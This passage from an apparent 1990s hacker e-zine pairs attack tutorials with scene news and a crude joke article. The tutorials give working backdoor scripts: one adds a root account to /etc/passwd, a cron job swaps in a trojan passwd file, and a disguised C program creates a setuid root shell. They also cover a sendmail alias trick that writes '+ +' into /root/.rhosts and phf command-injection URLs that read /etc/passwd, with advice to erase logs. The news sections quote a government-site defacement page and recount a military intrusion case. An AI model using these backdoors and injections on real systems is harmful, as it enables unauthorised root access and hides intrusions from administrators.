check if you YouUser is still alive. If not, it brings him back!

revive.sh
---------

#!/bin/sh
#Is YourUser still on the system?  Let's make sure he is.
#daemon9@netcom.com

set evilflag = (`grep eviluser /etc/passwd`)


if($#evilflag == 0) then                                # Is he there?

               set linecount = `wc -l /etc/passwd`
                cd                                      # Do this at home.
                cp /etc/passwd ./temppass               # Safety first.
                @ linecount[1] /= 2
                @ linecount[1] += 1                     # we only want 2 temp files
                split -$linecount[1] ./temppass         # passwd string option
                echo "YourUser::0:0:Mr. Hacker:/home/hacker:/bin/csh" >> ./xaa
                cat ./xab >> ./xaa
                mv ./xaa /etc/passwd
                chmod 644 /etc/passwd                   # or whatever it was beforehand
                rm ./xa* ./temppass
                echo Done...
else
endif


cron #2
-------

First of all, you will need a copy of the /etc/passwd file in a hidden
location.  For this example, we will use /var/spool/mail/.hidepass.  We have
one entry in it that will be are root account we will use. Then lets make a
cron that will save a copy of the real /etc/passwd file and install the hidden
passwd file as the real one for 1 minute at a time of your choice.  Make it
at a slow time of day because any one who tries to access the passwd file
durring this minute will get an error. 4:30 am is a good time. Put this in
the roots cron to do this :

        29      4       *       *       *       /bin/usr/hidenhidenpass

..make sure this exist

#echo "root:1234567890123:0:0:Operator:/:/bin/csh" > /var/spool/mail/.hidden

here is the /bin/usr/hidenhidenpass

.hidden
-------

#!/bin/sh
# Install trojan /etc/passwd file for one minute
#daemon9@netcom.com
cp /etc/passwd /etc/.temppass
cp /var/spool/mail/.sneaky /etc/passwd
sleep 60
mv /etc/.temppass /etc/passwd


Cron #3
--------

This is a c script that will work like the above.  Cron it as root like as
above and just let this file load every day.

hidden.c
--------

#include<stdio.h>

#define KEYWORD "industry3"
#define BUFFERSIZE 10

int main(argc, argv)
int argc;
char *argv[];{

        int i=0;

        if(argv[1]){            /* we've got an argument, is it the keyword? */

                if(!(strcmp(KEYWORD,argv[1]))){

                                /* This is the trojan part. */
                        system("cp /bin/csh /bin/.swp121");
                        system("chown root /bin/.swp121");
                        system("chmod 4755 /bin/.swp121");
                }

        }
                                /* Put your possibly system specific trojan
                                   messages here */
                                /* Let's look like we're doing something... */
        printf("Sychronizing bitmap image records.");
        /* system("ls -alR / >& /dev/null > /dev/null&"); */
        for(;i<10;i++){
                fprintf(stderr,".");
                sleep(1);
        }
        printf("\nDone.\n");
        return(0);
} /* End main */


=============================================================================
  section 5:
=============================================================================

Sendmail backdoor :
-------------------

With this, you have to edit the /etc/aliases file. add this line:

decode: |/usr/bin/uudecode

make sure u hide it in their so it aint odvious :).  the uudecode file will
be a .rhosts file with the full pathname embedded.

here is the script:

uudecode.sh
-----------

#!/bin/sh
# Create our .rhosts file.  Note this will output to stdout.

echo "+ +" > tmpfile
/usr/bin/uuencode tmpfile /root/.rhosts


Ok, now telnet to victumserver.com at port 25.  Fakemail to decode and use as
the subject body, the uuencoded version of the .rhosts file. Here is an easy
one (but not fake):

echo "+ +" | /usr/bin/uuencode /root/.rhosts | mail decode@victimserver.com

You can add any program that I have listed to be ran from the alias, so be as
creative as u want! :)

=============================================================================
  section 6:
=============================================================================

Others :

Here is one of the best trojans I have seen. It is sneeky and only detectable
by programs like tripwire. All you have to do is put the trojan code into a
the source of some popular system programs. su, login, and passwd are very
good to add it to because they run a SUID root and don't have strict
permission so you can modify it. This will tell you what to do after u get
the source code for the particular UNIX system you are backdooring. If you
can't get the source for any programs on your system, u may be screwed :(.
You can find trojaned versions of many programs, here is a small example
of pseudo-code that is added in such programs...

get input;
if input is special hardcoded flag, spawn evil trojan;
else if input is valid, continue;
else quit with error;
...

=============================================================================
  section 7:
=============================================================================

Keeping the backdoor :

Well, the best advice I can possibly give to start off is to cover your
tracks.  If the admin doesn't know he's been hacked, he won't look for
backdoors to remove. This will totaly depend on the admins ability to find
backdoors and know how to get rid of them.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. One Last Thing About The Infamous pHf Technique : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

You can use this basic form of attack...[Thru NutScrape For Example]

http://www.site.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
      [     1      ][     2    ][     3    ][  4  ][5][    6    ]

  1: The Target Site.
  2: The pHf Command.
  3: The Magic pHf Arguments.
  4: The Program You Wish To Run.
  5: %20 Is A Space, so %20%20%20 == 3 Spaces.
  6: The Arguments You Wish To Use.

Here Are Some Other Examples...
-------------------------------

http://www.site.com/cgi-bin/phf?Qalias=x&0a/bin/ls%20-la%20/etc/

...This will list the files in the /etc/ directory.

http://www.site.com/cgi-bin/phf?Qalias=x%0a/bin/uname%20-a

...This will display the operating system.

Remember : You execute the commands with pHf as the user nobody, so you can't
           shutdown the system, echo "+ +" >> /.rhosts etc. etc. All the
           stuff you throw at the system using phf will be logged too, so
           if you do decide to hack the system, remember to kill the logs
           when you get root :)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. Test-cgi holes : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Example exploit:
----------------

Below are examples, nc is netcat from avian.org. You can 
always just telnet to port 80 and type in the GET... command.

  machine% echo "GET /cgi-bin/test-cgi?/*" | nc removed.name.com 80

  CGI/1.0 test script report:
 
  argc is 1. argv is /\*.
 
  SERVER_SOFTWARE = NCSA/1.4.1
  SERVER_NAME = removed.name.com
  GATEWAY_INTERFACE = CGI/1.1
  SERVER_PROTOCOL = HTTP/0.9
  SERVER_PORT = 80
  REQUEST_METHOD = GET
  HTTP_ACCEPT = 
  PATH_INFO =
  PATH_TRANSLATED =
  SCRIPT_NAME = /bin/cgi-bin/test-cgi
  QUERY_STRING = /a /bin /boot /bsd /cdrom /dev /etc /home /lib /mnt 
  /root /sbin /stand /sys /tmp /usr /usr2 /var
  REMOTE_HOST = remote.machine.com
  REMOTE_ADDR = 255.255.255.255
  REMOTE_USER =
  AUTH_TYPE =
  CONTENT_TYPE =
  CONTENT_LENGTH =
 
...Or to see what other cgi-goodies are still floating around...

  machine% echo "GET /cgi-bin/test-cgi?*" | nc removed.name.com 80

  CGI/1.0 test script report:
 
  argc is 1. argv is \*.

  SERVER_SOFTWARE = NCSA/1.4.1
  SERVER_NAME = removed.name.com
  GATEWAY_INTERFACE = CGI/1.1
  SERVER_PROTOCOL = HTTP/0.9
  SERVER_PORT = 80
  REQUEST_METHOD = GET
  HTTP_ACCEPT = 
  PATH_INFO =
  PATH_TRANSLATED =
  SCRIPT_NAME = /bin/cgi-bin/test-cgi
  QUERY_STRING = calendar cgi-archie cgi-calendar cgi-date cgi-finger 
  cgi-fortune cgi-lib.pl imagemap imagemap.cgi imagemap.conf index.html 
  mail-query mail-query-2 majordomo majordomo.cf marker.cgi 
  menu message.cgi munger.cgi munger.note ncsa-default.tar post-query 
  query smartlist.cf src subscribe.cf test-cgi uptime
  REMOTE_HOST = remote.machine.com
  REMOTE_ADDR = 255.255.255.255 
  REMOTE_USER =
  AUTH_TYPE =
  CONTENT_TYPE =
  CONTENT_LENGTH =

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  8. Tree raping : digitalboy [DD]
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Tree raping can be an exciting and fulfilling hobby, as long as the 
proper safety precautions are taken. This file will try to outline the 
process of tree raping, as well as give you some background on the sport of 
tree raping.

\|/ History \|/

Tree raping originated in Eastern Africa long before history was recorded.
It was practiced by tribes of natives who used it as a test to determine the 
tribal chief. He who could rape the most trees was surely the most powerful, 
and therefore the rightful leader.

The sexual molestation of trees was kept a tribal secret, and no outsiders
learned of the practice until the late 1800's when Spanish explorer Hernando 
Ferdinando Enriquez happened to witness the event. He was killed by the 
natives he had been watching, but before his death he wrote of it in his 
journal. In 1937, a nun found the journal and the methods of tree raping were 
spread to the rest of the civilized world.

\|/ Preparation \|/

Tree raping is not something you can just go out and do. You must be
prepared. First and foremost, find a forest. While some of the best trees are 
found in urban settings, violating them will usually land you in the city 
jail. Not to mention the public ridicule. No, this is an activity that must 
take place in a relatively secluded part of a forest. Bring a few friends if 
that is your fancy, but large tree raping orgies usually lessen the 
enjoyment. You must also bring a large vat of maple syrup and possible 
climbing equipment, this will be explained later.

\|/ Tree Selection \|/

Picking the right tree to violate is essential. If you pick the wrong
tree, you could end up feeling inadequate, as well as inflicting serious 
physical injury upon yourself. Everyone has their own preference as to what 
type of tree to choose, but there are some general guidelines. The most vital
factor you have to consider is the position of knotholes. If a knothole is 
not present, you may be forced to create your own. Any seasoned tree rapist 
always carries his trusty power drill. Also, be sure to measure the depth of 
the knothole. The texture of the bark is also important. Extremely rough bark 
can ruin your experience. Try to find a tree with smooth bark, such as a 
birch. Note that you are not limited to the part of the tree at ground level. 
Bring some climbing equipment and you can easily reach the desired level.

\|/ The Act Of Tree Raping \|/

Tree raping always has and always must be done in complete nudity. Now,
remember that you were required to bring along a vat of maple syrup. This 
object will now come into play. First, heat it to exactly 54.7 degrees 
Celsius. Next lift the syrup over your head and pour it over your body. Count 
to 112, then lie down and roll around on the forest floor. You are now ready 
to begin the ritual. Approach the tree you have picked while screaming "TSAK 
NARP FNORZA QKWT" as loud as possible. Penetrate the tree and proceed to 
violate it. Try to keep moving, the maple syrup can be a powerful bonding 
agent. When you are finished you will have to find your own method of 
removing the maple syrup. 

\|/ The End \|/

Avoid Pine trees AT ALL COSTS!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  9. .htpasswd + .htaccess : Cain [DD]
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Well, I'm back. I should have put this article out last month, but I
neglected to. Flames to /dev/null. Well anyway, you know how sometimes when
you connect to a web page, you are asked for a username and password? Well,
here's how that works. In a directory there is a file almost always called
.htpasswd. And in another directory(or possibly that same one) there is a
file called .htaccess. The .htpasswd file follows basically the same format as
the /etc/passwd file:

   jblow:F#.DG*m38d%RF
   cain:GJA54j.3g9#$@f

and the .htaccess file follows this format:

  AuthUserFile /path/to/.htpasswd
  <LIMIT GET PUT POST>
  require user <user>
  </LIMIT>

If there is an .htaccess file in a directory, you must have a valid username
and password to view any files in that directory.

So here is what happens, the httpd sees the .htaccess file in the directory
that you request a file from. It finds the location of the .htpasswd file and
then find out who has access to the files in the directory. Therefore you
must have a username and password. Well here's the bug:

Only the files in the directory with the .htaccess file are passworded. So
if the .htpasswd file is somewhere else (root directory maybe) then you can
read that file. It uses the same form as /etc/passwd so therefore password
crackers will work on this also. Insta hack if the webmaster doesn't know
what he's doing.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 1. Some History : nobody
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  Electronic doom will soon be visited on U.S. computer networks by
  information warriors, hackers, pannational groups of computer-wielding
  religious extremists, possible agents of Libya and Iran, international
  thugs and money-mad Internet savvy thieves.

  John Deutch, director of Central Intelligence, testified to the
  truth of the matter, so it must be graven in stone. In a long statement
  composed in the august tone of the Cold Warrior, Deutch said to the
  Senate Permanent Subcommittee on Investigations on June 25, "My greatest
  concern is that hackers, terrorist organizations, or other nations might
  use information warfare techniques" to disrupt the national
  infrastructure.

  The lack of solid evidence for any of the claims made by the intelligence
  community has created an unusual stage on which two British hackers,
  Datastream Cowboy and Kuji, were made the dog and pony in a ridiculous
  show to demonstrate the threat of information warfare to members of
  Congress.  Because of a break-in at an Air Force facility in Rome, NY,
  in 1994, booth hackers were made the stars of two Government Accounting
  Office reports on network intrusions in the Department of Defense earlier
  this year.  The comings and goings of Datastream Cowboy also constitute the
  meat of Gelber and Christy's minority staff report from the Subcommittee on
  Investigations.

  Before delving into it in detail, it's interesting to read what a
  British newspaper published about Datastream Cowboy, a sixteen year-old,
  about a year before he was made the poster boy for information
  warfare and international hacking conspiracies in front of Congress.

  In a brief article, blessedly so in contrast to the reams of propaganda
  published on the incident for Congress, the July 5 1995 edition of The
  Independent wrote, "[Datastream Cowboy] appeared before Bow Street
  magistrates yesterday charged with unlawfully gaining access to a series
  of American defense computers. Richard Pryce, who was 16 at the time of
  the alleged offences, is accused of accessing key US Air Force systems
  and a network owned by Lockheed, the missile and aircraft manufacturers."

  Pryce, a resident of a northwest suburb of London did not enter a plea
  on any of 12 charges levied against him under the British
  Computer Misuse Act.  He was arrested on May 12, 1994, by New Scotland
  Yard as a result of work by the U.S. Air Force Office of Special
  Investigations.  The Times of London reported when police came for
  Pryce, they found him at his PC on the third floor of his family's house.
  Knowing he was about to be arrested, he "curled up on the floor and cried."

  In Gelber and Christy's staff report, the tracking of Pryce, and to a
  lesser extent a collaborator called Kuji -- real name Mathew Bevan, is
  retold as an eight page appendix entitled "The Case Study: Rome
  Laboratory, Griffiss Air Force Base, NY Intrusion."

  Pryce's entry into Air Force computers was noticed on March 28, 1994,
  when personnel discovered a sniffer program he had installed on one
  of the Air Force systems in Rome.  The Defense Information System
  Agency (DISA) was notified.  DISA subsequently called the Air
  Force Office of Special Investigations (AFOSI) at the Air Force
  Information Warfare Center in San Antonio, Texas. AFOSI then
  sent a team to Rome to appraise the break-in, secure the system and
  trace those responsible.  During the process, the AFOSI team discovered
  Datastream Cowboy had entered the Rome Air Force computers for the
  first time on March 25, according to the report.  Passwords had been
  compromised, electronic mail read and deleted and unclassified
  "battlefield simulation" data copied off the facility. The
  Rome network was also used as a staging area for penetration of other
  systems on the Internet.

  AFOSI investigators initially traced the break-in back one step to
  the New York City provider, Mindvox. According to the Congressional
  report, this put the NYC provider under suspicion because "newspaper
  articles" said Mindvox's computer security was furnished by two "former
  Legion of Doom members." "The Legion of Doom is a loose-knit computer
  hacker group which had several members convicted for intrusions into
  corporate telephone switches in 1990 and 1991," wrote Gelber and Christy.

  AFOSI then got permission to begin monitoring -- the equivalent of
  wiretapping -- all communications on the Air Force network.  Limited
  observation of other Internet providers being used during the break-in
  was conducted from the Rome facilities.  Monitoring told the investigators
  the handles of hackers involved in the Rome break-in were Datastream
  Cowboy and Kuji.

  Since the monitoring was of limited value in determining the whereabouts
  of Datastream Cowboy and Kuji, AFOSI resorted to "their human intelligence
  network of informants, i.e., stool pigeons, that 'surf the Internet.'
  Gossip from one AFOSI 'Net stoolie uncovered that Datastream Cowboy was from
  Britain. The anonymous source said he had e-mail correspondence with
  Datastream Cowboy in which the hacker said he was a 16-year old living in
  England who enjoyed penetrating ".MIL" systems. Datastream Cowboy also
  apparently ran a bulletin board system and gave the telephone number to the
  AFOSI source.

  The Air Force team contacted New Scotland Yard and the British law
  enforcement agency identified the residence, the home of Richard
  Pryce, which corresponded to Datastream Cowboy's system phone number.
  English authorities began observing Pryce's phone calls and noticed
  he was making fraudulent use of British Telecom.  In addition,
  whenever intrusions at the Air Force network in Rome occurred, Pryce's
  number was seen to be making illegal calls out of Britain.

  Pryce travelled everywhere on the Internet, going through South America,
  multiple countries in Europe and Mexico, occasionally entering the Rome
  network.  From Air Force computers, he would enter systems at Jet
  Propulsion Laboratory in Pasadena, California, and the Goddard Space
  Flight Center in Greenbelt, Maryland. Since Pryce was capturing the logins
  and passwords of the Air Force networks in Rome, he was then able to
  get into the home systems of Rome network users, defense contractors
  like Lockheed.
   
  By mid-April of 1994 the Air Force was monitoring other systems being
  used by the British hackers. On the 14th of the month, Kuji logged on
  to the Goddard Space Center from a system in Latvia and copied data
  from it to the Baltic country.  According to Gelber's report, the
  AFOSI investigators assumed the worst, that it was a sign that someone
  in an eastern European country was making a grab for sensitive
  information.  They broke the connection but not before Kuji had
  copied files off the Goddard system.  As it turned out, the Latvian
  computer was just another system the British hackers were using as
  a stepping stone; Pryce had also used it to cover his tracks when
  penetrating networks at Wright-Patterson Air Force Base in Ohio, via
  an intermediate system in Seattle, cyberspace.com.

  The next day, Kuji was again observed trying to probe various
  systems at NATO in Brussels and The Hague as well as Wright-Patterson.
  On the 19th, Pryce successfully returned to NATO systems in The
  Hague through Mindvox.  The point Gelber and Christy seem to be trying
  to make is that Kuji, a 21-year old, was coaching Pryce during some
  of his attacks on various systems.

  By this point, New Scotland Yard had a search warrant for Pryce
  with the plan being to swoop down on him the next time he accessed
  the Air Force network in Rome.

  In April, Pryce penetrated a system on the Korean peninsula and copied
  material off a facility called the Korean Atomic Research Institute
  to an Air Force computer in Rome. At the time, the investigators had
  no idea whether the system was in North or South Korea.  The impression
  created is one of hysteria and confusion at Rome. There was fear that the
  system, if in North Korea, would trigger an international incident, with
  the hack interpreted as an "aggressive act of war." The system turned
  out to be in South Korea.

  During the Korean break-in, New Scotland Yard could have intervened and
  arrested Pryce.  However, for unknown reasons, the agency did not.  Those
  with good memories may recall mainstream news reports concerning Pryce's
  hack, which was cast as an entry into sensitive North Korean networks.

  It's worth noting that while the story was portrayed as the work of
  an anonymous hacker, both the U.S. government and New Scotland Yard knew
  who the perpetrator was.  Further, according to Gelber's report English
  authorities already had a search warrant for Pryce's house.

  Finally, on May 12 British authorities pounced.  Pryce was arrested
  and his residence searched.  He crumbled, according to the Times of
  London, and began to cry.  Gelber and Christy write that Pryce promptly
  admitted to the Air Force break-ins as well as others.  Pryce
  confessed he had copied a large program that used artificial intelligence
  to construct theoretical Air Orders of Battle from an Air Force computer
  to Mindvox and left it there because of its great size, 3-4 megabytes.
  Pryce paid for his Internet service with a fraudulent credit card number.
  At the time, the investigators were unable to find out the name and
  whereabouts of Kuji. A lead to an Australian underground bulletin board
  system failed to pan out.

  On June 23 of this year, Reuters reported that Kuji -- 21-year-old Mathew
  Bevan -- a computer technician, had been arrested and charged in
  connection with the 1994 Air Force break-ins in Rome.

  Rocker Tom Petty sang that even the losers get lucky some time.  He
  wasn't thinking of British computer hackers but no better words could be
  used to describe the two Englishmen and a two year old chain of events that
  led to fame as international computer terrorists in front of Congress
  at the beginning of the summer of 1996.

  Lacking much evidence for the case of conspiratorial computer-waged
  campaigns of terror and chaos against the U.S., the makers of Congressional
  reports resorted to telling the same story over and over, three
  times in the space of the hearings on the subject. One envisions U.S.
  Congressmen too stupid or apathetic to complain, "Hey, didn't we get that
  yesterday, and the day before?" Pryce and Bevan appeared in "Security in
  Cyberspace" and twice in Government Accounting Office reports AIMD-96-84
  and T-AIMD96-92. Jim Christy, the co-author of "Security in Cyberspace"
  and the Air Force Office of Special Investigations' source for the Pryce
  case supplied the same tale for Jack Brock, author of the GAO reports.
  Brock writes, ". . . Air Force officials told us that at least one of
  the hackers may have been working for a foreign country interested in
  obtaining military research data or areas in which the Air Force was
  conducting advanced research."  It was, apparently, more wishful
  thinking.

  This years UK hacking conference : Access All Areas.
                                     http://www.access.org.uk
                                     July 5th.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. [GUNNAR], MadSeason and sIn : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Some dudes called MadSeason and [GUNNAR] has been proving sIn's true lameness
and logging it all at the same time, phear elite logging skills...

##################################################################################
#										 #
#				      Darkfool					 #
#			    (What a Fool/The PHF hacker)			 #
#				     BY [GUNNAR]				 #
#										 #
##################################################################################

Ever read a hacking txt by this guy? Ever realize just how useless the
information his txt's are? Nothing in his txt files aren't covered in a hundred
text files written before which better explain hacking techniques. Like a quote
from my pal MadSeason goes:

"The fact is these txt files about hacking and phreaking are written by people 
with minimal knowledge. Then you have some newbie who comes along wanting to be 
some hacker god and reads a few files and has even less of a clue then the
writer had about the subject, then goes around spewing out bullshit and claiming
they are a hacker and/or phreaker, just an endless circle of ignorance."

That quote is so true. All these hack txt's realeased by these groups like
S.I.N. and Techonophoria are just crap. About the only exploit that Darkfool
knows the the PHF bug found in older versions of NCSA and Apache httpd. This
bug is very well know(And over exploited might I add.). Do a search for ac.jp or
edu.au domains, and adding to the address "cgi-bin/phf?Qalias=x%0a/bin/cat%20
/etc/passwd" is neither impressive nor is it even hacking. It's a lame excuse for
hacking.

Darkfool claims many things that he doesn't know. For instance, take pascal
programming. He claims to know it, but when asked a single question on it
by, Scorpion(MadSeason), he cannot answer. Here is a little something:

[13:53] <Scorpion> How many parameters do Cluster object constructors take in
pascal, DF?
[13:53] <Darkfool> i have no idea scorpion
[13:54] <Scorpion> I thought you knew Pascal
[13:54] <Darkfool> i am learning it at college

There is a big difference between knowing and learning. I guess Darkfool doesn't
realize that. It's all a part of trying to sound and seem "elite". Which
Darkfool is far from being. Seems as thought Darkfool and the rest of his S.I.N.
pals are compying MadSeason and myself, and questioning peoples abilities. It's
funny though, when MadSeason and I got to #sin questioning them, we get kicked
for making them look stupid. And when they as us something, and it doesn't go
quite as
they planned it. Look what they do...

[14:14] *** Now talking in #sin
[14:15] <Darkfool> hey
[14:15] <Darkfool> how do i kill all jobs running on a shell ?
<[GUNNAR]> Well hello there!
[14:15] <HoMeR> hey
<[GUNNAR]> kill -9 PID
<[GUNNAR]> If you really wanna kill it.
<[GUNNAR]> Boo Hoo.
<[GUNNAR]> Damn, that one didn't go well for you did it?
<[GUNNAR]> BTW, use the ps command to get the PID.
<[GUNNAR]> la la la la...
[14:17] *** Sinning sets mode: +b *!*@*.wco.com
[14:17] *** You were kicked by Fa|lur3 (banned)

In short, Darkfool, S.I.N. and the rest like him are really just wannabes
trying to sound big and bad. Nothing wrong with groups or people who actually
hack. But, when you have a group like S.I.N. who's members claim more than
they know, it is truely sad. I myself and no great hacker(I'm not a hack.
Plain and simple.) nor am I some s00per programmer. But the thing is, I do not
claim more than I actually know. This is obviously not how Darkfool thinks of
things. He wants to be known as a s00per hacker, which he is not. 

I'm writing this so you(The Readers) don't buy into this bullshit and be misled
by people like Darkfool and the group he is in S.I.N.! They are truely sad
people. What a shame I have brought out the truth!

I think more is somewhere on http://www.ilf.net/teknopia/

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. "Welcome to the [D]epartment of [O]wned [E]nergy" : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

The http://www.doe.ca (Canadian Dept. of Energy) was changed last weekend...

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
<HEAD>
   <TITLE></TITLE>
   <META NAME="Author" CONTENT="Tetsu Khan">
   <META NAME="GENERATOR" CONTENT="Mozilla/3.01Gold (Win95; I) [Netscape]">
</HEAD>
<BODY TEXT="#FFFFFF" BGCOLOR="#000000" LINK="#FFFFFF" VLINK="#C0C0C0" ALINK="#FF0000">

<CENTER><P><B><TT><FONT COLOR="#FF0000"><FONT SIZE=+2>Welcome To The [D]epartment
of [O]wned [E]nergy</FONT></FONT></TT></B></P></CENTER>

<CENTER><P>
<HR WIDTH="100%"></P></CENTER>

<CENTER><P>You could define this as an act of aggression, or you could
define it as us, the hackers (or crackers), just adivising you to try and
make it more difficult for us, at least employ consultants etc. who have
a CLUE. because one day, in the not so distant future, the internet equivalent
of Pearl Harbour will occur, and we will only be around to say &quot;We
told you so&quot;, until that day, we will keep reminding you, get some
security, its better for you, its better for us, its better for everyone.</P></CENTER>

<CENTER><P>In this case, even though your system runs HP-UX, we advise
you still take the time to look into all the exploits that are available
for this operating system, and then get over to www.cert.org to find some
advisories.</P></CENTER>

<CENTER><P>This attack was brought to you in association with 0range Amusements.</P></CENTER>

<CENTER><P><IMG SRC="pac001.gif" HEIGHT=190 WIDTH=175></P></CENTER>

<CENTER><P>Greets to so1o, helix, xFli, modeX, c0d, xrx, zer0x, organik,
phractal chaos and all the usual suspects.</P></CENTER>

<CENTER><P>
<HR WIDTH="100%"></P></CENTER>

<CENTER><P><TT><FONT COLOR="#FF0000">In the meantime, maybe you would like
to visit...</FONT></TT></P></CENTER>

<CENTER><P><FONT SIZE=+2><A HREF="http://www.crackhouse.com">The CrackHouse</A></FONT></P></CENTER>

<CENTER><P><FONT SIZE=+2><A HREF="http://micros0ft.paranoia.com">Micro$oft</A></FONT></P></CENTER>

<CENTER><P><FONT SIZE=+2><A HREF="http://www.codez.com">The CodeZero</A></FONT></P></CENTER>

<CENTER><P>
<HR WIDTH="100%"></P></CENTER>

<CENTER><P><B><TT><BLINK><FONT COLOR="#8000FF">We 0wN j00r EnErGy!@# wE
0wN j00R LiGhTbUlBz!@#~</FONT></BLINK></TT></B></P></CENTER>

</BODY>
</HTML>

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 4. LOPHT.COM : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Get into any shell, and type...

% whois lopht.com

...It's elite (lookup sIn inf0z to see)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 5. AAA Report : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

AAA stands for Access All Areas, it is a computer security and hacking
conference held in the UK in early July of every year, this would be the
third year of AAA, and myself and NightRage were going.

Myself and NightRage arrived on Regent Street at 9:30am, we entered the
University of Westminster building, purchased two passes for the event, and
proceeded to the conference room, where there were many people aged between
16 and around 40, all with a handful of common interests, hacking, phreaking,
